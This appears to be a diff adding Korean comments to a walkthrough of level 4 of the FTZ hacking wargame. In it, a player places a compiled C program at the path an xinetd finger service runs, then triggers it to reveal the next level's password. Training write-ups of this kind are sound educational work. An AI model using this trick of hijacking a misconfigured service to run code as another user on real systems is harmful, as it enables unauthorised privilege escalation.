@@ -36,7 +36,7 @@ drwxr-xr-x   52 root     root         4096 Dec 21 11:40 ..
 -rw-r--r--    1 root     root          305 Sep 10  2011 telnet
 -rw-r--r--    1 root     root          495 Dec 19  2007 time
 -rw-r--r--    1 root     root          515 Dec 19  2007 time-udp
-[level4@ftz xinetd.d]$ cat ./backdoor
+[level4@ftz xinetd.d]$ cat ./backdoor		### backdoor 파일내용 출력
 service finger
 {
         disable = no
@@ -47,15 +47,18 @@ service finger
         server          = /home/level4/tmp/backdoor
         log_on_failure  += USERID
 }
-[level4@ftz xinetd.d]$ cd /home/level4/tmp/backdoor
+
+[level4@ftz xinetd.d]$ cd /home/level4/tmp/backdoor	
+### server에 적혀있는 경로로 가본다
 -bash: cd: /home/level4/tmp/backdoor: No such file or directory
+### 경로에 backdoor 파일이 없다
 [level4@ftz xinetd.d]$ cd /home/level4/tmp
-[level4@ftz tmp]$ vi backdoor.c
+[level4@ftz tmp]$ vi backdoor.c	###경로에서 backdoor 프로그램을 만들어준다
 
 #include<stdio.h>
 #include<stdlib.h>
 int main(void){
-        system("my-pass");
+        system("my-pass");	### my-pass명령을 실행시키는 파일을 만든다
         return 0;
 }
 ~
@@ -109,12 +112,17 @@ int main(void){
 ~
 ~
 ~
-:wq
+:wq	### :wq로 저장후 종료
 
-[level4@ftz tmp]$ gcc -o backdoor backdoor.c
-[level4@ftz tmp]$ gcc -o ./backdoor ./backdoor.c
+[level4@ftz tmp]$ gcc -o ./backdoor ./backdoor.c	
+### backdoor.c 파일을 backdoor이라는 이름으로 컴파일
+
 [level4@ftz tmp]$ finger @localhost
+### finger는 리눅스에서 사용자의 계정정보를 확인하는 명령어
+### -$ finger @host명: host명만 적고 user를 명시하지 않으면, 해당서버에 접속해있는 모든 유저의 정보를 출력
+
 ^[[H^[[J
 Level5 Password is "what is your name?".
 
 [level4@ftz tmp]$
+
